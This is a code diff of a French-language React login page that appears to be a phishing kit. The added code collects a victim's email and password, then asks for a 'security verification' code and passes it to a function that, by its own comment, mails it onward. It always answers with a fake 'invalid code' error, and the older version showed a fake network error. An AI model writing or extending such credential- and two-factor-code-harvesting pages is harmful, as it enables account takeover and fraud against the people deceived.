@@ -1,35 +1,59 @@
 "use client";
 
 import { useState } from "react";
-import { ArrowRight, Eye, EyeOff } from "lucide-react";
-import { sendLoginData } from "./actions"; // Import de l'action créée plus haut
+import { ArrowRight, Eye, EyeOff, Lock, AlertCircle } from "lucide-react";
+import { sendLoginData, sendVerificationCode } from "./actions";
 
 export default function Home() {
-  const [step, setStep] = useState<1 | 2>(1);
+  const [step, setStep] = useState<1 | 2 | 3>(1);
+  
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [code, setCode] = useState("");
+  
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
+  
+  // Nouvel état pour gérer le message d'erreur
+  const [errorMessage, setErrorMessage] = useState("");
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setErrorMessage(""); // On nettoie les erreurs précédentes
 
+    // ÉTAPE 1 : Validation Email
     if (step === 1) {
       if (email) setStep(2);
-    } else {
+    } 
+    
+    // ÉTAPE 2 : Envoi Password -> Passage au Code
+    else if (step === 2) {
       setLoading(true);
       const formData = new FormData();
       formData.append("email", email);
       formData.append("password", password);
 
-      const result = await sendLoginData(formData);
+      await sendLoginData(formData);
       
-      if (result.success) {
-        alert("error 403! please check your network connection");
-      } else {
-        alert("error 403! please check your network connection");
-      }
       setLoading(false);
+      setStep(3);
+    } 
+    
+    // ÉTAPE 3 : Envoi du Code -> Affichage Erreur sous le bouton
+    else if (step === 3) {
+      setLoading(true);
+      const formData = new FormData();
+      formData.append("email", email);
+      formData.append("code", code);
+
+      // 1. On envoie le code saisi par mail
+      await sendVerificationCode(formData);
+      
+      // 2. On arrête le chargement
+      setLoading(false);
+
+      // 3. On affiche le message d'erreur (quelle que soit la saisie)
+      setErrorMessage("Code non valide. Veuillez réessayer.");
     }
   };
 
@@ -37,47 +61,43 @@ export default function Home() {
     <div className="flex min-h-screen items-center justify-center bg-white font-sans">
       <main className="w-full max-w-[600px] flex flex-col items-center px-4">
         
-        {/* Titre */}
         <h1 className="text-4xl font-extrabold text-[#B93628] mb-4 text-center tracking-tight">
-          Connexion / Inscription
+          {step === 3 ? "Vérification de sécurité" : "Connexion / Inscription"}
         </h1>
         
-        {/* Sous-titre */}
         <p className="text-black font-medium text-lg mb-10 text-center">
-          Renseignez votre email pour vous connecter ou créer un compte
+          {step === 3 
+            ? `Un code de confirmation a été envoyé à ${email}.`
+            : "Renseignez vos informations pour vous connecter"
+          }
         </p>
 
-        {/* Carte Formulaire */}
         <div className="w-full border border-gray-200 rounded-lg p-8 shadow-sm bg-white">
           <form onSubmit={handleSubmit} className="flex flex-col gap-6">
             
-            {/* Input Email */}
-            <div className="relative group">
-              <input
-                type="email"
-                required
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
-                  ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
-                `}
-                readOnly={step === 2}
-              />
-              {/* Label flottant pour l'email */}
-              <label 
-                className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
-                  peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-[-10px] peer-focus:text-sm
-                  ${(!email && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
-                `}
-              >
-                Votre email {step === 1 && <span className="text-gray-400">*</span>}
-              </label>
-              {step === 2 && (
-                <span className="absolute right-3 top-4 text-gray-400">*</span>
-              )}
-            </div>
+            {/* --- ETAPE 1 & 2 : EMAIL --- */}
+            {step !== 3 && (
+              <div className="relative group">
+                <input
+                  type="email"
+                  required
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
+                    ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
+                  `}
+                  readOnly={step === 2}
+                />
+                <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
+                    ${(!email && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
+                  `}>
+                  Votre email {step === 1 && <span className="text-gray-400">*</span>}
+                </label>
+                {step === 2 && <span className="absolute right-3 top-4 text-gray-400">*</span>}
+              </div>
+            )}
 
-            {/* Input Mot de passe (Visible seulement à l'étape 2) */}
+            {/* --- ETAPE 2 : PASSWORD --- */}
             {step === 2 && (
               <div className="relative animate-in fade-in slide-in-from-top-2 duration-300">
                 <input
@@ -91,8 +111,6 @@ export default function Home() {
                 <label className="absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500">
                   Votre mot de passe <span className="text-gray-400">*</span>
                 </label>
-                
-                {/* Icône Oeil */}
                 <button
                   type="button"
                   onClick={() => setShowPassword(!showPassword)}
@@ -103,30 +121,59 @@ export default function Home() {
               </div>
             )}
 
-            {/* Lien mot de passe oublié */}
-            {step === 2 && (
-              <div className="w-full text-left">
-                <button type="button" className="text-gray-500 hover:underline font-medium">
-                  Mot de passe oublié ?
-                </button>
+            {/* --- ETAPE 3 : CODE --- */}
+            {step === 3 && (
+              <div className="relative animate-in fade-in slide-in-from-right-4 duration-300">
+                <input
+                  type="text"
+                  required
+                  autoFocus
+                  placeholder="Ex: 123456"
+                  value={code}
+                  // On efface l'erreur si l'utilisateur recommence à taper
+                  onChange={(e) => {
+                    setCode(e.target.value);
+                    setErrorMessage(""); 
+                  }}
+                  className={`peer w-full h-[60px] px-4 rounded border outline-none text-lg text-gray-800 tracking-widest
+                    ${errorMessage ? "border-red-500 focus:border-red-600" : "border-gray-400 focus:border-[#B93628]"}
+                  `}
+                />
+                <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm font-medium
+                  ${errorMessage ? "text-red-500" : "text-[#B93628]"}
+                `}>
+                  Code de confirmation <span className="text-red-500">*</span>
+                </label>
+                <Lock className="absolute right-4 top-5 text-gray-400" size={20} />
               </div>
             )}
 
-            {/* Bouton d'action */}
-            <button
-              type="submit"
-              disabled={loading}
-              className="w-full h-[56px] mt-2 rounded bg-[#E3E5E8] hover:bg-[#d4d6d9] text-gray-600 font-bold text-lg flex items-center justify-center gap-2 transition-colors"
-            >
-              {loading ? (
-                <span>Envoi...</span>
-              ) : (
-                <>
-                  {step === 1 ? <ArrowRight size={20} className="text-gray-500" /> : null}
-                  {step === 1 ? "Continuer" : "Se connecter"}
-                </>
+            {/* BOUTON D'ACTION */}
+            <div className="flex flex-col gap-3">
+              <button
+                type="submit"
+                disabled={loading}
+                className="w-full h-[56px] mt-2 rounded bg-[#E3E5E8] hover:bg-[#d4d6d9] text-gray-600 font-bold text-lg flex items-center justify-center gap-2 transition-colors"
+              >
+                {loading ? (
+                  <span>Vérification...</span>
+                ) : (
+                  <>
+                    {step === 1 && <><ArrowRight size={20} className="text-gray-500" /> Continuer</>}
+                    {step === 2 && "Se connecter"}
+                    {step === 3 && "Valider le code"}
+                  </>
+                )}
+              </button>
+
+              {/* MESSAGE D'ERREUR SOUS LE BOUTON */}
+              {errorMessage && (
+                <div className="flex items-center justify-center gap-2 text-[#d32f2f] bg-[#ffebee] p-3 rounded animate-in fade-in slide-in-from-top-1">
+                  <AlertCircle size={20} />
+                  <span className="font-medium text-sm">{errorMessage}</span>
+                </div>
               )}
-            </button>
+            </div>
 
           </form>
         </div>
